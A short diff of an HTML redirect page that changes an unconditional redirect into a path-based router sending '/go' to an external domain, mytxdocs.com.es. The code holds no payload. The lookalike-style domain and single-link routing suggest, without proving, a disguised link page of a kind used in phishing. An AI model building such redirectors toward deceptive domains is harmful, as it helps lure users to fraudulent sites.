@@ -1,12 +1,25 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta http-equiv="refresh" content="0; url=https://mytxdocs.com.es/ga/">
-    <script>
-        window.location.replace("https://mytxdocs.com.es/ga/");
-    </script>
+  <meta charset="utf-8">
+  <title>Redirecting...</title>
 </head>
 <body>
-    Redirecting...
+<script>
+  // 🎯 SINGLE LINK ROUTE
+  const routes = {
+    "go": "https://mytxdocs.com.es/ga/"
+  };
+
+  const path = window.location.pathname.replace("/", "");
+
+  const target = routes[path];
+
+  if (target) {
+    window.location.replace(target);
+  } else {
+    document.body.innerHTML = "Link not found";
+  }
+</script>
 </body>
 </html>
